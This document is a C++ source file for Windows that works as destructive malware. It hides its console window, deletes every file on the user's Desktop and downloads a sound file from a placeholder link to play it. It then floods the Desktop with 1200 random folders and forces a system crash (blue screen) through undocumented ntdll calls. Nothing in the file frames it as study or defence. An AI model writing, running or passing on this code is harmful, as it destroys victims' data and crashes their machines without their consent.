#include <iostream>
#include <Windows.h>
#include <string>
#include <filesystem>
#include <ShObjIdl.h>
#include <random>
#include <direct.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "urlmon.lib")

#pragma warning(disable:4996)

typedef NTSTATUS( NTAPI * pdef_NtRaiseHardError )( NTSTATUS ErrorStatus , ULONG NumberOfParameters , ULONG UnicodeStringParameterMask OPTIONAL , PULONG_PTR Parameters , ULONG ResponseOption , PULONG Response );
typedef NTSTATUS( NTAPI * pdef_RtlAdjustPrivilege )( ULONG Privilege , BOOLEAN Enable , BOOLEAN CurrentThread , PBOOLEAN Enabled );

namespace fs = std::filesystem;

void TriggerBlueScreen( )
{
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress( LoadLibraryA( "ntdll.dll" ) , "RtlAdjustPrivilege" );
	LPVOID lpFuncAddress2 = GetProcAddress( GetModuleHandle( "ntdll.dll" ) , "NtRaiseHardError" );
	pdef_RtlAdjustPrivilege NtCall = ( pdef_RtlAdjustPrivilege ) lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = ( pdef_NtRaiseHardError ) lpFuncAddress2;
	NTSTATUS NtRet = NtCall( 19 , TRUE , FALSE , &bEnabled );
	NtCall2( STATUS_FLOAT_MULTIPLE_FAULTS , 0 , 0 , 0 , 6 , &uResp );
}

std::vector<std::string> _files;

void GetAllFilesFromDesktop( ) {

	std::string DESKTOP = ( std::string ) getenv( "USERPROFILE" ) + "\\Desktop\\";
	for ( const auto & entry2 : fs::directory_iterator( DESKTOP ) )
		_files.push_back( entry2.path( ).string( ) );
}

void DeleteAllFiles( )
{
	for ( auto file : _files )
	{
		remove( file.c_str( ) );
	}
}

std::string RandomLetter( )
{
	std::string letters[ ] = { "a", "b", "c", "d", "e", "f", "g", "h", "i",
					"j", "k", "l", "m", "n", "o", "p", "q", "r",
					"s", "t", "u", "v", "w", "x", "y", "z" };

	std::random_device r;
	std::seed_seq seed { r( ), r( ), r( ), r( ), r( ), r( ), r( ), r( ) };
	std::shuffle( std::begin( letters ) , std::end( letters ) ,
		std::mt19937( seed ) );

	for ( auto c : letters )
		return c;
}


bool Download( std::string link , std::string path )
{
	return URLDownloadToFile( NULL , link.c_str( ) , path.c_str( ) , 0 , NULL );
}

void CreateRandomFolder( std::string path ) {
	std::string name;
	for ( int b = 0; b < 4; b++ )
		name += RandomLetter( );
	_mkdir( std::string( path + name ).c_str( ) );
}


int main( )
{
	ITaskbarList * pTaskList = NULL;
	HRESULT initRet = CoInitialize( NULL );
	HRESULT createRet = CoCreateInstance( CLSID_TaskbarList ,
		NULL ,
		CLSCTX_INPROC_SERVER ,
		IID_ITaskbarList ,
		( LPVOID * ) &pTaskList );

	if ( createRet == S_OK )
	{
		pTaskList->DeleteTab( GetConsoleWindow( ) );
		pTaskList->Release( );
	}

	CoUninitialize( );

	ShowWindow( GetConsoleWindow( ) , SW_MINIMIZE );

	GetAllFilesFromDesktop( );
	DeleteAllFiles( );

	Download( "insert the download link here" , "sound.wav" );

	while ( !fs::exists( "sound.wav" ) )
		Sleep( 100 );

	std::string DESKTOP = ( std::string ) getenv( "USERPROFILE" ) + "\\Desktop\\";

	PlaySound( TEXT( "sound.wav" ) , NULL , SND_FILENAME /* | SND_ASYNC*/ );

	for ( int i = 0; i < 1200; i++ ){
		CreateRandomFolder( DESKTOP );
	}

	Sleep( 2000 );
	TriggerBlueScreen( );

	return 0;
}